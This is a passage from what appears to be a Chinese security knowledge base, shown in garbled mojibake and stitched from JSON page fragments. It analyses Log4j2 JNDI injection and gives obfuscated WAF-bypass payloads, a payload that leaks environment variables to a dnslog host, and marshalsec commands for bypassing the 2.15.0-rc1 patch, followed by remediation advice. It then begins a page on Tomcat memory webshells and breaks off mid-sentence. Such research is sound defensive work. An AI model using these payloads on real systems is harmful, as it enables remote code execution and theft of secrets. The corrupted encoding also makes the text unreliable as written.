log4jï¼Œè¿˜æœ‰åˆ†éš”ç¬¦å•¥çš„ï¼Œç»“åˆèµ·æ¥å¯ä»¥ç»•è¿‡å¤§å¤šæ•°å¸¸è§çš„WAFäº†ã€‚ å¤šä¸ª${}æ‰§è¡Œæµç¨‹ å…ˆæ¥åˆ†æä¸€ä¸‹å¤šä¸ª${}çš„æ‰§è¡Œæµç¨‹ï¼ŒPayloadä¸¾ä¾‹å¦‚ä¸‹ï¼š ${aaa:${bbb:ccc}dd}${ee:ff} å½“è¯†åˆ«åˆ°å¤šä¸ª${}æ—¶ï¼Œå‡†å¤‡æ¥è¯´æ˜¯è¯†åˆ«åˆ°å¤šä¸ª${æ—¶ï¼Œä¸»è¦åˆ†ä¸ºä¸¤ç§æƒ…å†µï¼š å½“å±äºåµŒå¥—ç±»å‹æ—¶ï¼Œæ¯”å¦‚${${}}ï¼Œå‚æ•°nestedVarCountä¼šæ‰§è¡Œ+1æ“ä½œï¼Œè¡¨ç¤ºå­˜åœ¨åµŒå¥—ï¼Œé˜²æ­¢æ‰¾é”™é—­åˆæ—¶ç”¨çš„}ï¼Œä¼šå…ˆå¤„ç†å†…éƒ¨çš„${}ï¼Œå†å°†å¤„ç†ç»“æœè¿”å›åç»§ç»­å¤„ç†${} ï¼›å…·ä½“çš„åŸå› ï¼Œå°±æ˜¯å› ä¸ºä¼šé€’å½’è°ƒç”¨substitute()ï¼Œæ‰€ä»¥ä¼šå…ˆæŠŠå†…éƒ¨çš„å¤„ç†å®Œ å½“å±äºå¹¶åˆ—ç±»å‹æ—¶ï¼Œæ¯”å¦‚${}${}ï¼Œä¼šä¾æ¬¡å¤„ç†${}ï¼›å› ä¸ºä»–ä¸€æ¬¡åªä¼šæå–ä¸€æ•´ä¸ª${} åˆ†éš”ç¬¦ org.apache.logging.log4j.core.lookup.StrSubstitutor#substitute()é‡Œå¤„ç†å®Œ${}åï¼Œå°±ä¼šæœ‰ä¸€éƒ¨åˆ†çš„åˆ†éš”ç¬¦å¤„ç†ï¼Œä¸€ä¸ªæ˜¯valueEscapeDelimiterMatcher [:\\-]ï¼Œå¦ä¸€ä¸ªæ˜¯valueDelimiterMatcher [:-] å…ˆæ¥çœ‹ç¬¬ä¸€ä¸ªvalueEscapeDelimiterMatcherï¼Œpayload ${aa:\\\\-bb} ä»ä¸‹å›¾å¯ä»¥çœ‹å‡ºæ¥ï¼Œå°±æ˜¯ç»™ :\\- ä¸­çš„ \\ å»æ‰äº†å˜æˆäº†:-ï¼Œå¥½åƒæ˜¯æ²¡å•¥ç”¨ å†æ¥çœ‹çœ‹valueDelimiterMatcherï¼Œpayload ${aa:-bb} ä»ä¸‹é¢å¯ä»¥çœ‹å‡ºæ¥ï¼Œè¢«:-åˆ†å‰²æˆäº†å‰åä¸¤éƒ¨åˆ†ï¼Œå‰é¢çš„éƒ¨åˆ†èµ‹å€¼ç»™varNameï¼Œåé¢éƒ¨åˆ†èµ‹å€¼ç»™varDefaultValueï¼› varNameä¼šè¢«ä¼ å…¥åˆ°resolveVariable()è¿›è¡Œè§£æï¼Œå¦‚æœæ²¡æœ‰åè®®ä»€ä¹ˆçš„ï¼Œå°±ä¼šè¿”å›null å¦‚æœresolveVariable()è¿”å›å€¼ä¸ºnullï¼ŒvarDefaultValueåœ¨åç»­çš„è¿‡ç¨‹ä¸­ä¹Ÿä¼šé€’å½’è°ƒç”¨substitute æœ€åä¼šè¿”å›varDefaultValueçš„å€¼ å…¶ä»–è§£æå™¨åŠŸæ•ˆ ä¸Šé¢åˆ†ææˆ‘ä»¬ä¹Ÿæ³¨æ„åˆ°äº†ï¼Œæœ‰å¤šä¸ªè§£æåè®®å¯ç”¨ï¼ŒåŒ…æ‹¬date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4jï¼Œæˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹ä½œç”¨ å¯ä»¥ä¸‹æ–­ç‚¹åˆ°org.apache.logging.log4j.core.lookup.StrSubstitutor#resolveVariableçš„resolver.lookup(event, variableName)è¿™ä¸€è¡Œï¼Œç„¶ååŠ¨æ€æ‰§è¡Œçœ‹æ•ˆæœï¼›æ¯”å¦‚ è§£æåè®® è¯´æ˜ date: æ—¥æœŸæ—¶é—´ï¼ˆè¯¦æƒ…org.apache.logging.log4j.core.lookup.DateLookup#lookupï¼‰ java: ä¸€äº›JVMçš„ä¿¡æ¯ï¼ˆå¯ç”¨å‚æ•°versionã€runtimeã€vmã€osã€hwã€localeï¼Œè¯¦æƒ…org.apache.logging.log4j.core.lookup.JavaLookup#lookupï¼‰ marker: è¿”å›event.getMarker()ï¼Œä¸çŸ¥é“å…·ä½“å¹²å•¥çš„ ctx:key è¿”å›event.getContextData().getValue(key)ï¼Œå°±æ˜¯è·å–ä¸Šä¸‹æ–‡çš„æ•°æ® lower:KEY è¿”å›å­—ç¬¦ä¸²å°å†™å€¼ upper:key è¿”å›å­—ç¬¦ä¸²å¤§å†™å€¼ jndi: JNDIæ³¨å…¥åˆ©ç”¨ç‚¹ï¼Œä¸å¤šè¯´äº† main:key è¿”å›((MapMessage) event.getMessage()).get(key)ï¼Œä¹Ÿæ˜¯è·å–ä¸€äº›å˜é‡å€¼ jvmrunargs: æ²¡ææ‡‚ã€‚ã€‚ã€‚ sys:key è¿”å›ä¸€äº›ç³»ç»Ÿå±æ€§ï¼šSystem.getProperty(key) env:key è¿”å›System.getenv(key) log4j:key è¿”å›ä¸€äº›log4jçš„é…ç½®ä¿¡æ¯ï¼Œå¯ç”¨å€¼configLocationã€configParentLocation ç»•è¿‡æ€è·¯ æˆ‘ä»¬å·²ç»çŸ¥é“äº†${}çš„æ‰§è¡Œæµç¨‹ï¼Œä¹ŸçŸ¥é“äº†åˆ†éš”ç¬¦æ€ä¹ˆå¤„ç†çš„ï¼ŒåˆçŸ¥é“äº†å…¶ä»–åè®®çš„è§£æè¿”å›å€¼ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ„é€ payloadæ¥ç»•è¿‡äº†ï¼Œä¸¾ä¸€äº›ä¾‹å­ åŸå§‹payload ${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=} ä¸€äº›ç»•è¿‡paylioad ${${a:-j}ndi:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=} ${${a:-j}n${::-d}i:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=} ${${lower:jn}di:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=} ${${lower:${upper:jn}}di:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=} ${${lower:${upper:jn}}${::-di}:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=} å¥‡æ·«æŠ€å·§ åˆšæ‰åˆ†æäº†å…¶ä»–è§£æå™¨åŠŸæ•ˆï¼Œé€šè¿‡syså’Œenvåè®®ï¼Œç»“åˆjndiå¯ä»¥è¯»å–åˆ°ä¸€äº›ç¯å¢ƒå˜é‡å’Œç³»ç»Ÿå˜é‡ï¼Œç‰¹å®šæƒ…å†µä¸‹å¯èƒ½å¯ä»¥è¯»å–åˆ°ç³»ç»Ÿå¯†ç  ä¸¾ä¸ªä¾‹å­ ${jndi:ldap://${env:LOGNAME}.eynz6t.dnslog.cn} 2.15.0-rc1è¡¥ä¸ç»•è¿‡ LOG4J2-3201 Commit å’Œä¹‹å‰ä¸€æ ·ï¼Œç›´æ¥æ¥åˆ°org.apache.logging.log4j.core.layout.PatternLayout.PatternFormatterPatternSerializer#toSerializableï¼›ç†Ÿæ‚‰çš„éå†formatteræ‹¼æ¥è¾“å‡ºå†…å®¹ åˆ°äº†æ‹¼æ¥æˆ‘ä»¬è‡ªå®šä¹‰å†…å®¹çš„éƒ¨åˆ†çš„æ—¶å€™ï¼Œè·Ÿè¿›ä¼šè°ƒç”¨converter.formatï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œçš„converterç±»å·²ç»å˜æˆäº†MessagePatternConverter.SimpleMessagePatternConverterï¼ŒSimpleMessagePatternConverteræ˜¯MessagePatternConverterçš„ä¸€ä¸ªå†…éƒ¨ç±» è·Ÿè¿›ï¼Œå‘ç°ä¼šè°ƒç”¨((StringBuilderFormattable) msg).formatTo(toAppendTo) å†è·Ÿè¿›formatToï¼Œå¯ä»¥çœ‹å‡ºå°±æ˜¯ç›´æ¥æ‹¼æ¥å­—ç¬¦ä¸²ï¼Œå¹¶ä¸ä¼šå¯¹åŒ…å«æœ‰ç‰¹æ®Šå†…å®¹${}çš„å­—ç¬¦ä¸²è¿›è¡Œå¤„ç† çœ‹ç€æ˜¯æ²¡é—®é¢˜äº†ï¼Œä½†æ˜¯å‘ç°åœ¨MessagePatternConverterä¸­è¿˜æœ‰ä¸€ä¸ªå†…éƒ¨ç±»LookupMessagePatternConverterï¼Œè¿™ä¸ªç±»ä¼šå¯¹${çš„å†…å®¹è¿›è¡Œç‰¹æ®Šå¤„ç†ã€‚ ä½†æ˜¯æ€ä¹ˆæ ·æ‰èƒ½è®©converterçš„ç±»å˜æˆLookupMessagePatternConverterï¼Œè€Œä¸æ˜¯SimpleMessagePatternConverterå‘¢ï¼Ÿ åœ¨newInstanceè¿™ä¸ªåˆå§‹åŒ–é…ç½®å‡½æ•°çš„åœ°æ–¹ä¸‹ä¸ªæ–­ç‚¹ï¼Œå‘ç°å¿…é¡»è¦æ»¡è¶³2ä¸ªæ¡ä»¶ï¼Œæ‰èƒ½ä½¿ç”¨LookupMessagePatternConverterè¿™ä¸ªconverterç±» æ‰€ä»¥è¿™ä¹Ÿæ˜¯è¡¥ä¸ç»•è¿‡æ¯”è¾ƒé¸¡è‚‹çš„åœ°æ–¹ï¼Œéœ€è¦è‡ªå·±æ‰‹åŠ¨ä¿®æ”¹é…ç½®ï¼Œæ­£å¸¸äººä¼šæ•…æ„è¿™ä¹ˆå†™å—ï¼Ÿ ä¸ºäº†åˆ†æç»•è¿‡ï¼Œæˆ‘ä»¬åªèƒ½æ‰‹åŠ¨é…ç½®äº†ã€‚ã€‚ã€‚ åˆ†æä¸Šé¢éœ€è¦æ»¡è¶³çš„2ä¸ªæ¡ä»¶ï¼š lookupsä¸ºtrueï¼Œlookupsçš„å€¼æ˜¯é€šè¿‡loadLookups(options)è¿™ä¸ªå‡½æ•°æ¥è·å¾—çš„ï¼Œåˆ†æä¸€ä¸‹è¿™ä¸ªå‡½æ•°ï¼Œåªè¦optionsè¿™ä¸ªå­—ç¬¦ä¸²æ•°ç»„åŒ…å«lookupså³å¯ éœ€è¦ä¸€ä¸ªconfigçš„å®ä¾‹ï¼Œå±äºorg.apache.logging.log4j.core.config.DefaultConfigurationè¿™ä¸ªç±»ï¼Œé»˜è®¤ä¸ä¸ºnull å°è¯•äº†å„ç§æ–¹æ³•ä¿®æ”¹é…ç½®éƒ½ä¸è¡Œ log4j2.formatMsgNoLookups=false log4j2.formatMsgLookups=true æ‰€ä»¥é‡‡ç”¨äº†ä¸€ä¸ªæš´åŠ›çš„æ–¹æ³•ï¼Œå°±æ˜¯åœ¨è°ƒè¯•çš„æ—¶å€™åŠ¨æ€ä¿®æ”¹optionså˜é‡çš„å€¼ options = new String[]{\"lookups\"} å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬ä¿®æ”¹è¿‡åï¼Œå†æ¬¡æ¥åˆ°converter.format(event, buf)ï¼Œæ­¤æ—¶converterå±äºMessagePatternConverter.LookupMessagePatternConverterç±»äº†ï¼Œç›®æ ‡è¾¾æˆ è·Ÿè¿›ä¹Ÿæ˜¯æˆ‘ä»¬æƒ³è¦çš„ç»“æœï¼Œå¯¹${è¿›è¡Œå®šä½åˆ¤æ–­ è·Ÿè¿›replaceInï¼Œå°±åˆåˆ°äº†å¸¸è§„çš„substituteäº†ï¼Œæ¥ä¸‹æ¥å‡ æ­¥å°±ä¸å†æ¬¡åˆ†æäº† ä¸Šé¢è¿™ä¹ˆå¤šéƒ½æ˜¯è§£å†³é…ç½®é—®é¢˜ï¼Œè®©å®ƒä½¿ç”¨åˆ°æˆ‘ä»¬æƒ³è¦çš„converterç±» åé¢éƒ½æ˜¯å’Œä¹‹å‰ç±»ä¼¼å·®ä¸å¤šçš„ï¼Œä¸€ç›´åˆ°äº†org.apache.logging.log4j.core.net.JndiManager#lookupï¼Œå¯ä»¥çœ‹å‡ºæ¥åŠ äº†å¾ˆå¤§ä¸€ä¸²try...catch...å¯¹æˆ‘ä»¬çš„payloadè¿›è¡Œåˆ¤æ–­ï¼Œä¸€æœ‰ä¸å¯¹åŠ²çš„åœ°æ–¹å°±return null è¿˜æ˜¯åˆ†æä¸€ä¸‹å„ä¸ªé™åˆ¶ å˜é‡ å€¼ allowedProtocols [java, ldap, ldaps] allowedHosts [localhost, 127.0.0.1, d4m1tsdeMacBook-Pro.local, fe80:0:0:0:511a:1574:bca8:fa1b%utun3, fe80:0:0:0:5f4b:9388:9617:a34f%utun2, fe80:0:0:0:da80:893a:2c2b:22c9%utun1, fe80:0:0:0:4936:2ec2:ac06:59d0%utun0, fe80:0:0:0:b853:76ff:fec8:ca3a%llw0, fe80:0:0:0:b853:76ff:fec8:ca3a%awdl0, fe80:0:0:0:aede:48ff:fe00:1122%en5, fe80:0:0:0:1421:ea1:4520:c8ab%en0, 192.168.0.106, fe80:0:0:0:0:0:0:1%lo0, 0:0:0:0:0:0:0:1] allowedClasses [java.lang.Boolean, java.lang.Byte, java.lang.Character, java.lang.Double, java.lang.Float, java.lang.Integer, java.lang.Long, java.lang.Short, java.lang.String] çœ‹ä¼¼æ— æ‡ˆå¯å‡»ï¼Œä½†æ˜¯å´æœ‰ä¸€ä¸ªå¾ˆä¸¥é‡çš„é—®é¢˜ å¦‚æœå‡ºç°URISyntaxExceptionå¼‚å¸¸ï¼Œå°±ä¼šç›´æ¥æ‰§è¡Œcatchï¼Œç„¶åå°±åˆ°äº†this.context.lookup(name)ï¼Œè¿˜æ˜¯å­˜åœ¨JNDIæ³¨å…¥ æ‰€ä»¥æˆ‘ä»¬ç°åœ¨çš„ç»•è¿‡æƒ³æ³•ï¼Œå°±æ˜¯æƒ³åŠæ³•è®©211è¡Œçš„URI uri = new URI(name);æŠ›å‡ºURISyntaxException åˆ†æä¸€ä¸‹è¿™ä¸ªæŠ¥é”™ï¼Œå°±å¯ä»¥å‘ç°è§¦å‘çš„æ–¹å¼è¿˜æ˜¯æŒºå¤šçš„ ä¹Ÿå¯ä»¥ç½‘ä¸Šæ‰¾æ‰¾ï¼Œæ¯”å¦‚ï¼š è¯•ä¸€ä¸‹ æ‰€ä»¥ç»•è¿‡æ–¹æ³•ï¼š java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://127.0.0.1:8000/ #Exploit\" 8088 python3 -m http.server 8000 # 127.0.0.1 - - [12/Dec/2021 14:04:04] \"GET /Exploit.class HTTP/1.1\" 200 - ${jndi:ldap://127.0.0.1:8088/ Exploit} ç»“æœï¼Œç»•è¿‡æˆåŠŸ 2.15.0-rc2ä¿®å¤ Handle URI exception Commit ä»githubä¸Šæäº¤çš„ä»£ç ï¼Œå¯ä»¥çœ‹å‡ºç»™catchæ²¡æœ‰return nullçš„é—®é¢˜ä¿®å¤äº† æš‚æ—¶è¿˜æ²¡æœ‰å¥½çš„ç»•è¿‡æ€è·¯ï¼Œæ‰€ä»¥å…ˆè¿™æ ·å§ å½±å“èŒƒå›´ srping-boot-strater-log4j2 Apache Solr Apache Flink Apache Druid Apache Struts2 ElasticSearch Flume Dubbo JedisLogstash Kafka ... ä¿®å¤å»ºè®® å‡çº§Apache Log4j2æ‰€æœ‰ç›¸å…³åº”ç”¨åˆ°æœ€æ–°çš„ log4j-2.15.0-rc2 ç‰ˆæœ¬ å‡çº§JDKç‰ˆæœ¬ï¼Œå»ºè®®JDKä½¿ç”¨11.0.1ã€8u191ã€7u201ã€6u211åŠä»¥ä¸Šçš„é«˜ç‰ˆæœ¬ï¼Œä»æ ¹æºä¸Šæœç»å¤§éƒ¨åˆ†å¸¸è§„çš„JNDIæ³¨å…¥ ä¸´æ—¶æªæ–½ åœ¨jvmå‚æ•°ä¸­æ·»åŠ  -Dlog4j2.formatMsgNoLookups=true ã€é’ˆå¯¹ 2.10.0 åŠä»¥ä¸Šçš„ç‰ˆæœ¬ã€‘ ç³»ç»Ÿç¯å¢ƒå˜é‡ä¸­å°†FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPSè®¾ç½®ä¸ºtrue ã€é’ˆå¯¹ 2.10.0 åŠä»¥ä¸Šçš„ç‰ˆæœ¬ã€‘ åˆ›å»ºâ€œlog4j2.component.propertiesâ€æ–‡ä»¶ï¼Œæ–‡ä»¶ä¸­å¢åŠ é…ç½®â€œlog4j2.formatMsgNoLookups=trueâ€ ã€é’ˆå¯¹ 2.10.0 åŠä»¥ä¸Šçš„ç‰ˆæœ¬ã€‘ é™åˆ¶å—å½±å“åº”ç”¨å¯¹å¤–è®¿é—®äº’è”ç½‘ Copyright Â© d4m1ts 2022 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2021-12-25 18:52:00 "},"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/3.å†…å­˜é©¬/01.Tomcatå†…å­˜é©¬.html":{"url":"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/3.å†…å­˜é©¬/01.Tomcatå†…å­˜é©¬.html","title":"01.Tomcatå†…å­˜é©¬","keywords":"","body":"TreeviewCopyright Â© d4m1ts all right reserved, powered by aleen42 å†…å­˜é©¬ç®€ä»‹ ä»€ä¹ˆæ˜¯å†…å­˜é©¬ å¦‚ä½•å®ç°å†…å­˜é©¬ å†…å­˜é©¬ç±»å‹ èƒŒæ™¯çŸ¥è¯† Java webä¸‰å¤§ä»¶ Servlet è¯·æ±‚çš„å¤„ç†è¿‡ç¨‹ servletç”Ÿå‘½å‘¨æœŸ ä»£ç ç¤ºä¾‹ Filter åŸºæœ¬å·¥ä½œåŸç† filterçš„ç”Ÿå‘½å‘¨æœŸ filteré“¾ ä»£ç ç¤ºä¾‹ Listener ä»£ç ç¤ºä¾‹ Tomcat Tomcatæ¶æ„è®¾è®¡ å…¶ä»–çŸ¥è¯† åå°„ java instrumentation servlet-apiå†…å­˜é©¬ç¼–å†™ Filterå†…å­˜é©¬ ServletContext ApplicationContext Filterç›¸å…³å˜é‡ åŠ¨æ€æ³¨å…¥å†…å­˜ Servletå†…å­˜é©¬ å¯åŠ¨ åŠ¨æ€æ³¨å…¥å†…å­˜ Listenerå†…å­˜é©¬ ServletRequestListeneræ¥å£ åŠ¨æ€æ³¨å…¥å†…å­˜ servlet-apiæ€»ç»“ å†…å­˜é©¬æŸ¥æ€ arthas copagent java-memshell-scanner å‚è€ƒ å†…å­˜é©¬ç®€ä»‹ ä»€ä¹ˆæ˜¯å†…å­˜é©¬ éšç€æ¯å¹´æ”»é˜²å¯¹æŠ—å¼ºåº¦çš„å¢åŠ ï¼Œæ™®é€šçš„webshellåœ¨å„å¤§å‚å•†çš„å®‰å…¨è®¾å¤‡ä¸‹ï¼Œæ ¹æœ¬éš¾ä»¥å­˜æ´»ï¼Œæƒ³è¦è½åœ°ä¸€ä¸ªå®ä½“webshellçš„éš¾åº¦é€æ¸å¢å¤§ã€‚é€æ­¥å®Œå–„çš„è¿‡æ»¤æœºåˆ¶ã€å‰åç«¯åˆ†ç¦»çš„è¶‹åŠ¿ï¼Œä½¿å¾—ä¼ ç»Ÿçš„webshellç”Ÿå­˜ç©ºé—´è¶Šæ¥è¶Šå°ã€‚äºæ˜¯ï¼Œéšç€æ—¶ä»£çš„å‘å±•ï¼Œå†…å­˜é©¬å‡ºç°äº†ã€‚ å†…å­˜é©¬å°±æ˜¯ä¸€ç§æ— éœ€è½åœ°æ–‡ä»¶å°±èƒ½ä½¿ç”¨çš„webshellï¼Œå®ƒå°†æ¶æ„ä»£ç å†™å…¥å†…å­˜ï¼Œæ‹¦æˆªå›ºå®šå‚æ•°æ¥è¾¾åˆ°webshellçš„æ•ˆæœã€‚ å¦‚ä½•å®ç°å†…å­˜é©¬ å®ç°ç›®æ ‡ï¼šè®¿é—®ä»»æ„urlæˆ–è€…æŒ‡å®šurlï¼Œå¸¦ä¸Šå‘½ä»¤æ‰§è¡Œå‚æ•°ï¼Œå³å¯è®©æœåŠ¡å™¨è¿”å›å‘½ä»¤æ‰§è¡Œç»“æœ å®ç°æ–¹æ³•ï¼šä»¥javaä¸ºä¾‹ï¼Œå®¢æˆ·ç«¯å‘èµ·çš„webè¯·æ±‚ä¼šä¾æ¬¡ç»è¿‡Listener-->Filter-->Servletä¸‰ä¸ªç»„ä»¶ï¼Œæˆ‘ä»¬åªè¦åœ¨è¿™ä¸ªè¯·æ±‚çš„è¿‡ç¨‹ä¸­åšæ‰‹è„šï¼Œåœ¨å†…å­˜ä¸­ä¿®æ”¹å·²æœ‰çš„ç»„ä»¶æˆ–è€…åŠ¨æ€æ³¨å†Œä¸€ä¸ªæ–°çš„ç»„ä»¶ï¼Œæ’å…¥æ¶æ„çš„shellcodeï¼Œå°±å¯ä»¥è¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„ã€‚ å†…å­˜é©¬ç±»å‹ æ ¹æ®æ³¨å…¥çš„æ–¹å¼ï¼Œå¤§æ¦‚åˆ†ç±»ä»¥ä¸‹ä¸¤ç±»ï¼š servlet-apiå‹ é€šè¿‡å‘½ä»¤æ‰§è¡Œç­‰æ–¹å¼åŠ¨æ€æ³¨å†Œä¸€ä¸ªæ–°çš„listenerã€filteræˆ–è€…servletï¼Œä»è€Œå®ç°å‘½ä»¤æ‰§è¡Œç­‰åŠŸèƒ½ã€‚ç‰¹å®šæ¡†æ¶ã€å®¹å™¨çš„å†…å­˜é©¬åŸç†ä¸æ­¤ç±»ä¼¼ï¼Œå¦‚springçš„controllerå†…å­˜é©¬ï¼Œtomcatçš„valveå†…å­˜é©¬ å­—èŠ‚ç å¢å¼ºå‹ é€šè¿‡javaçš„instrumentationåŠ¨æ€ä¿®æ”¹å·²æœ‰ä»£ç ï¼Œè¿›è€Œå®ç°å‘½ä»¤æ‰§è¡Œç­‰åŠŸèƒ½ã€‚ èƒŒæ™¯çŸ¥è¯† Java webä¸‰å¤§ä»¶ è¯¦æƒ…çš„å¯ä»¥è‡ªå·±å»ç ”ç©¶ï¼Œæœç´¢å…³é”®è¯maven tomcat servlet å¼€å‘ï¼Œè¿™é‡Œå¤§æ¦‚æè¿°ä¸€ä¸‹ Servlet Servlet æ˜¯è¿è¡Œåœ¨ Web æœåŠ¡å™¨æˆ–åº”ç”¨æœåŠ¡å™¨ä¸Šçš„ç¨‹åºï¼Œå®ƒæ˜¯ä½œä¸ºæ¥è‡ª HTTP å®¢æˆ·ç«¯çš„è¯·æ±‚å’Œ HTTP æœåŠ¡å™¨ä¸Šçš„æ•°æ®åº“æˆ–åº”ç”¨ç¨‹åºä¹‹é—´çš„ä¸­é—´å±‚ã€‚å®ƒè´Ÿè´£å¤„ç†ç”¨æˆ·çš„è¯·æ±‚ï¼Œå¹¶æ ¹æ®è¯·æ±‚ç”Ÿæˆç›¸åº”çš„è¿”å›ä¿¡æ¯æä¾›ç»™ç”¨æˆ·ã€‚ è¯·æ±‚çš„å¤„ç†è¿‡ç¨‹ æµè§ˆå™¨å‘ Web æœåŠ¡å™¨å‘é€äº†ä¸€ä¸ª HTTP è¯·æ±‚ï¼ŒServletå®¹å™¨æ ¹æ®æ”¶åˆ°çš„è¯·æ±‚ï¼Œä¼šå…ˆåˆ›å»ºä¸€ä¸ª HttpServletRequest å’Œ HttpServletResponse å¯¹è±¡ è°ƒç”¨ç›¸åº”çš„ Servlet ç¨‹åºï¼Œåœ¨ Servlet ç¨‹åºè¿è¡Œæ—¶ï¼Œå®ƒé¦–å…ˆä¼šä» HttpServletRequest å¯¹è±¡ä¸­è¯»å–æ•°æ®ä¿¡æ¯ï¼Œç„¶åé€šè¿‡ service() æ–¹æ³•å¤„ç†è¯·æ±‚æ¶ˆæ¯ service()æ–¹æ³•æ ¹æ®è¯·æ±‚ç±»å‹ï¼Œåˆ†åˆ«è°ƒç”¨doGetæˆ–è€…doPostæ–¹æ³•ï¼Œå…¶ä¸­doXXXæ–¹æ³•æ˜¯æˆ‘ä»¬è‡ªå·±å†™çš„é€»è¾‘Controller å°†å¤„ç†åçš„å“åº”æ•°æ®å†™å…¥åˆ° HttpServletResponse å¯¹è±¡ä¸­ã€‚ Web æœåŠ¡å™¨ä¼šä» HttpServletResponse å¯¹è±¡ä¸­è¯»å–åˆ°å“åº”æ•°æ®ï¼Œå¹¶å‘é€ç»™æµè§ˆå™¨ å®¹å™¨å…³é—­æ—¶å€™ï¼Œä¼šè°ƒç”¨destoryæ–¹æ³• éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨WebæœåŠ¡å™¨è¿è¡Œé˜¶æ®µï¼Œæ¯ä¸ªServletéƒ½åªä¼šåˆ›å»ºä¸€ä¸ªå®ä¾‹å¯¹è±¡ï¼Œé’ˆå¯¹æ¯æ¬¡HTTPè¯·æ±‚ï¼ŒWebæœåŠ¡å™¨éƒ½ä¼šè°ƒç”¨æ‰€è¯·æ±‚Servletå®ä¾‹çš„ serviceï¼ˆHttpServletRequest requestï¼ŒHttpServletResponse responseï¼‰æ–¹æ³•ï¼Œå¹¶é‡æ–°åˆ›å»ºä¸€ä¸ª request å¯¹è±¡å’Œä¸€ä¸ª response å¯¹è±¡ã€‚ servletç”Ÿå‘½å‘¨æœŸ æœåŠ¡å™¨å¯åŠ¨æ—¶(web.xmlä¸­é…ç½®load-on-startup=1ï¼Œé»˜è®¤ä¸º0)æˆ–è€…ç¬¬ä¸€æ¬¡è¯·æ±‚è¯¥servletæ—¶ï¼Œå°±ä¼šåˆå§‹åŒ–ä¸€ä¸ªServletå¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯ä¼šæ‰§è¡Œåˆå§‹åŒ–æ–¹æ³•init(ServletConfig conf)ã€‚ servletå¯¹è±¡å»å¤„ç†æ‰€æœ‰å®¢æˆ·ç«¯è¯·æ±‚ï¼Œåœ¨service(ServletRequest reqï¼ŒServletResponse res)æ–¹æ³•ä¸­æ‰§è¡Œ æœåŠ¡å™¨å…³é—­æ—¶ï¼Œé”€æ¯è¿™ä¸ªservletå¯¹è±¡ï¼Œæ‰§è¡Œdestroy()æ–¹æ³•ã€‚ ç”±JVMè¿›è¡Œåƒåœ¾å›æ”¶ã€‚ ä»£ç ç¤ºä¾‹ Filter filterä¹Ÿç§°ä¹‹ä¸ºè¿‡æ»¤å™¨ï¼Œæ˜¯å¯¹ServletæŠ€æœ¯çš„ä¸€ä¸ªå¼ºè¡¥å……ï¼Œå…¶ä¸»è¦åŠŸèƒ½æ˜¯åœ¨HttpServletRequeståˆ°è¾¾ Servlet ä¹‹å‰ï¼Œæ‹¦æˆªå®¢æˆ·çš„HttpServletRequest ï¼Œæ ¹æ®éœ€è¦æ£€æŸ¥HttpServletRequestï¼Œä¹Ÿå¯ä»¥ä¿®æ”¹HttpServletRequest å¤´å’Œæ•°æ®ï¼›åœ¨HttpServletResponseåˆ°è¾¾å®¢æˆ·ç«¯ä¹‹å‰ï¼Œæ‹¦æˆªHttpServletResponse ï¼Œæ ¹æ®éœ€è¦æ£€æŸ¥HttpServletResponseï¼Œä¹Ÿå¯ä»¥ä¿®æ”¹HttpServletResponseå¤´å’Œæ•°æ®ã€‚ ç®€å•æ¥è¯´å°±æ˜¯åœ¨Servletå¤„ç†è¯·æ±‚å‰å’ŒServletå“åº”è¯·æ±‚åå®ç°ä¸€äº›ç‰¹æ®Šçš„åŠŸèƒ½ åŸºæœ¬å·¥ä½œåŸç† 1ã€Filter ç¨‹åºæ˜¯ä¸€ä¸ªå®ç°äº†ç‰¹æ®Šæ¥å£çš„ Java ç±»ï¼Œä¸ Servlet ç±»ä¼¼ï¼Œä¹Ÿæ˜¯ç”± Servlet å®¹å™¨è¿›è¡Œè°ƒç”¨å’Œæ‰§è¡Œçš„ã€‚ 2ã€å½“åœ¨ web.xml æ³¨å†Œäº†ä¸€ä¸ª Filter æ¥å¯¹æŸä¸ª Servlet ç¨‹åºè¿›è¡Œæ‹¦æˆªå¤„ç†æ—¶ï¼Œå®ƒå¯ä»¥å†³å®šæ˜¯å¦å°†è¯·æ±‚ç»§ç»­ä¼ é€’ç»™ Servlet ç¨‹åºï¼Œä»¥åŠå¯¹è¯·æ±‚å’Œå“åº”æ¶ˆæ¯æ˜¯å¦è¿›è¡Œä¿®æ”¹ã€‚ 3ã€å½“ Servlet å®¹å™¨å¼€å§‹è°ƒç”¨æŸä¸ª Servlet ç¨‹åºæ—¶ï¼Œå¦‚æœå‘ç°å·²ç»æ³¨å†Œäº†ä¸€ä¸ª Filter ç¨‹åºæ¥å¯¹è¯¥ Servlet è¿›è¡Œæ‹¦æˆªï¼Œé‚£ä¹ˆå®¹å™¨ä¸å†ç›´æ¥è°ƒç”¨ Servlet çš„ service æ–¹æ³•ï¼Œè€Œæ˜¯è°ƒç”¨ Filter çš„ doFilter æ–¹æ³•ï¼Œå†ç”± doFilter æ–¹æ³•å†³å®šæ˜¯å¦å»æ¿€æ´» service æ–¹æ³•ã€‚ 4ã€ä½†åœ¨ Filter.doFilter 